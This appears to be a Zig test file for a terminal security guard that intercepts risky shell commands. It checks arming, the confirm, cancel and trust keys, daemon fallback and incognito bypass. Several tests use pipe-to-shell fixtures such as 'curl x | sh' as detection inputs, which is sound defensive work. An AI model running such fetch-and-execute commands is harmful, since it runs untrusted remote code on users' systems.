const std = @import("std");
const testing = std.testing;
const mod = @import("security_guard.zig");
const m = @import("../module.zig");
const LineState = @import("../line_state.zig").LineState;

test {
    _ = @import("security_guard/patterns.zig");
    _ = @import("security_guard/trust_cache.zig");
    _ = @import("security_guard/uds_client.zig");
}

const Sink = struct {
    buf: std.ArrayList(u8) = .empty,

    fn write(opaque_ptr: *anyopaque, bytes: []const u8) anyerror!void {
        const self: *Sink = @ptrCast(@alignCast(opaque_ptr));
        try self.buf.appendSlice(testing.allocator, bytes);
    }
};

fn makeCtx(line: *LineState, scratch: *std.ArrayList(u8)) m.Context {
    return .{
        .allocator = testing.allocator,
        .io = undefined,
        .line = line,
        .scratch = scratch,
        .is_tty = false,
    };
}

test "disabled by default — onInput is a passthrough" {
    const L = mod.configure(.{});
    var rt = try L.attach(testing.allocator, undefined);
    defer L.detach(&rt, undefined);
    var sink: Sink = .{};
    defer sink.buf.deinit(testing.allocator);
    L.setSink(&rt, &sink, Sink.write);

    var line: LineState = .{};
    line.setCommitted("curl x | sh");
    var scratch: std.ArrayList(u8) = .empty;
    defer scratch.deinit(testing.allocator);
    var ctx = makeCtx(&line, &scratch);

    const action = try L.onInput(&rt, &ctx, "\r");
    try testing.expect(action == .forward);
}

test "enabled — curl|sh on Enter arms + emits banner" {
    const L = mod.configure(.{ .enabled = true, .trust_cache_path = "/tmp/atty-secguard-test-banner.txt" });
    var rt = try L.attach(testing.allocator, undefined);
    defer L.detach(&rt, undefined);
    var sink: Sink = .{};
    defer sink.buf.deinit(testing.allocator);
    L.setSink(&rt, &sink, Sink.write);

    var line: LineState = .{};
    line.setCommitted("curl https://x.com | sh");
    var scratch: std.ArrayList(u8) = .empty;
    defer scratch.deinit(testing.allocator);
    var ctx = makeCtx(&line, &scratch);

    const action = try L.onInput(&rt, &ctx, "\r");
    try testing.expect(action == .swallow);
    try testing.expect(rt.armed);
    try testing.expect(std.mem.indexOf(u8, sink.buf.items, "security_guard") != null);
    try testing.expect(std.mem.indexOf(u8, sink.buf.items, "remote-fetch-and-execute") != null);
}

test "enabled — armed + `n` cancels via Ctrl+U" {
    const L = mod.configure(.{ .enabled = true, .trust_cache_path = "/tmp/atty-secguard-test-cancel.txt" });
    var rt = try L.attach(testing.allocator, undefined);
    defer L.detach(&rt, undefined);
    var sink: Sink = .{};
    defer sink.buf.deinit(testing.allocator);
    L.setSink(&rt, &sink, Sink.write);

    var line: LineState = .{};
    line.setCommitted("curl x | sh");
    var scratch: std.ArrayList(u8) = .empty;
    defer scratch.deinit(testing.allocator);
    var ctx = makeCtx(&line, &scratch);

    _ = try L.onInput(&rt, &ctx, "\r");
    try testing.expect(rt.armed);

    const action = try L.onInput(&rt, &ctx, "n");
    try testing.expect(action == .replace);
    try testing.expectEqualSlices(u8, "\x15", action.replace);
    try testing.expect(!rt.armed);
}

test "enabled — armed + `y` allows once via CR" {
    const L = mod.configure(.{ .enabled = true, .trust_cache_path = "/tmp/atty-secguard-test-yes.txt" });
    var rt = try L.attach(testing.allocator, undefined);
    defer L.detach(&rt, undefined);
    var sink: Sink = .{};
    defer sink.buf.deinit(testing.allocator);
    L.setSink(&rt, &sink, Sink.write);

    var line: LineState = .{};
    line.setCommitted("curl x | sh");
    var scratch: std.ArrayList(u8) = .empty;
    defer scratch.deinit(testing.allocator);
    var ctx = makeCtx(&line, &scratch);

    _ = try L.onInput(&rt, &ctx, "\r");
    const action = try L.onInput(&rt, &ctx, "y");
    try testing.expect(action == .replace);
    try testing.expectEqualSlices(u8, "\r", action.replace);
}

test "enabled — armed + `t` trusts permanently + persists" {
    const path = "/tmp/atty-secguard-test-trust.txt";
    _ = std.c.unlink(path);
    defer _ = std.c.unlink(path);

    const L = mod.configure(.{ .enabled = true, .trust_cache_path = path });
    var rt = try L.attach(testing.allocator, undefined);
    defer L.detach(&rt, undefined);
    var sink: Sink = .{};
    defer sink.buf.deinit(testing.allocator);
    L.setSink(&rt, &sink, Sink.write);

    var line: LineState = .{};
    line.setCommitted("curl x.example | sh");
    var scratch: std.ArrayList(u8) = .empty;
    defer scratch.deinit(testing.allocator);
    var ctx = makeCtx(&line, &scratch);

    _ = try L.onInput(&rt, &ctx, "\r");
    _ = try L.onInput(&rt, &ctx, "t");
    try testing.expect(rt.trust.entries.items.len == 1);

    var line2: LineState = .{};
    line2.setCommitted("curl x.example | sh");
    var ctx2 = makeCtx(&line2, &scratch);
    const action = try L.onInput(&rt, &ctx2, "\r");
    try testing.expect(action == .forward);
}

test "enabled — non-Enter while not armed is passthrough" {
    const L = mod.configure(.{ .enabled = true, .trust_cache_path = "/tmp/atty-secguard-test-noenter.txt" });
    var rt = try L.attach(testing.allocator, undefined);
    defer L.detach(&rt, undefined);

    var line: LineState = .{};
    var scratch: std.ArrayList(u8) = .empty;
    defer scratch.deinit(testing.allocator);
    var ctx = makeCtx(&line, &scratch);

    const action = try L.onInput(&rt, &ctx, "a");
    try testing.expect(action == .forward);
    try testing.expect(!rt.armed);
}

test "enabled — clean line passes through" {
    const L = mod.configure(.{ .enabled = true, .trust_cache_path = "/tmp/atty-secguard-test-clean.txt" });
    var rt = try L.attach(testing.allocator, undefined);
    defer L.detach(&rt, undefined);

    var line: LineState = .{};
    line.setCommitted("ls -la");
    var scratch: std.ArrayList(u8) = .empty;
    defer scratch.deinit(testing.allocator);
    var ctx = makeCtx(&line, &scratch);

    const action = try L.onInput(&rt, &ctx, "\r");
    try testing.expect(action == .forward);
    try testing.expect(!rt.armed);
}

test "daemon path set but socket missing → falls back to in-proc patterns" {
    // Configure a socket that doesn't exist. The module should
    // mark daemon_disabled after the first failed call and let the
    // in-proc patterns arm the banner.
    const L = mod.configure(.{
        .enabled = true,
        .trust_cache_path = "/tmp/atty-secguard-test-daemon-missing.txt",
        .daemon_socket_path = "/tmp/atty-guard-nonexistent-XYZ.sock",
    });
    var rt = try L.attach(testing.allocator, undefined);
    defer L.detach(&rt, undefined);
    var sink: Sink = .{};
    defer sink.buf.deinit(testing.allocator);
    L.setSink(&rt, &sink, Sink.write);

    var line: LineState = .{};
    line.setCommitted("curl x | sh");
    var scratch: std.ArrayList(u8) = .empty;
    defer scratch.deinit(testing.allocator);
    var ctx = makeCtx(&line, &scratch);

    const action = try L.onInput(&rt, &ctx, "\r");
    try testing.expect(action == .swallow);
    try testing.expect(rt.armed);
    try testing.expect(rt.daemon_disabled); // sticky disable
    // Banner still shows — fallback worked.
    try testing.expect(std.mem.indexOf(u8, sink.buf.items, "security_guard") != null);
}

test "skip_in_incognito = true bypasses matching" {
    const L = mod.configure(.{ .enabled = true, .skip_in_incognito = true, .trust_cache_path = "/tmp/atty-secguard-test-incog.txt" });
    var rt = try L.attach(testing.allocator, undefined);
    defer L.detach(&rt, undefined);
    var sink: Sink = .{};
    defer sink.buf.deinit(testing.allocator);
    L.setSink(&rt, &sink, Sink.write);

    var line: LineState = .{};
    line.setCommitted("curl x | sh");
    var scratch: std.ArrayList(u8) = .empty;
    defer scratch.deinit(testing.allocator);
    var ctx = makeCtx(&line, &scratch);
    ctx.incognito = true;

    const action = try L.onInput(&rt, &ctx, "\r");
    try testing.expect(action == .forward);
}
